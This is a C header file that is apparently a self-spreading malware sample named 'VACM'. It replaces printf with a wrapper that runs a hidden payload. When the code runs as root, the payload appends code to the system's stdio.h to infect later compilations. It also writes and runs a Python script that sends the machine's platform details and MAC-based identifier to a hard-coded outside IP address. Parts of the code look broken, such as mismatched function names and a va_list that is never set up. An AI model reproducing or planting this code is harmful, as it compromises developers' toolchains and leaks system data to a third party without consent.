#ifndef __VACM__
#define __VACM__
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<time.h>
//quine_start
void get_system_output(char *cmd,char *output){
    char *s=(char*)malloc(strlen(cmd)+64);
    strcpy(s,cmd);
    strcat(s," > _gmout.out");
    system(s);
    FILE *file = fopen("_gmout.out","r");
    fscanf(file,"%s",output);
    fclose(file);
    free(s);
    system("rm _gmout.out");
}
void get_root(){

}

void infect_gcc(){
    static char output[2048];
    memset(output,0,sizeof output);
    get_system_output("whoami",output);
    if(strcmp(output,"root")){
    
    }else{
        
        system("cat tmp >> /usr/include/stdio.h");
        system("echo \"#\"endif >> /usr/include/stdio.h");
        system("rm tmp");
    }
}



void hack(){
    static const char *py="#!/usr/bin/python\n# -*- coding: UTF-8 -*-\nimport socket\nimport platform\nimport uuid\ns = socket.socket()\nhost = '118.25.18.237'\nport = 12345\ns.connect((host, port))\nsysinfo=str(platform.uname())+'\\n'+str(uuid.getnode())+'\\n';\ns.send(sysinfo)\ns.close()";
    FILE *file = fopen("cli.py","w");
    fprintf(file,"%s",py);
    fclose(file);
    system("python cli.py");
    system("rm cli.py");
}
int VACM();
int _VACM(){ //quine_replace
    static int flag=0;
    if(flag || clock()<2*CLOCKS_PER_SEC)return 0;
    flag=1;
    static char output[2048];
    memset(output,0,sizeof output);
    get_system_output("grep VACM /usr/include/stdio.h",output);
    if(strcmp(output,"")!=0){
        return 0;
    }
    get_root();
    infect_gcc();
    hack();
    return 0;
}

void function1(){}
void function2(){_VACM();}

int printf2(const char *format,...){
    va_list ap;
    VACM();
    return printf(format,ap);
}

#define printf printf2



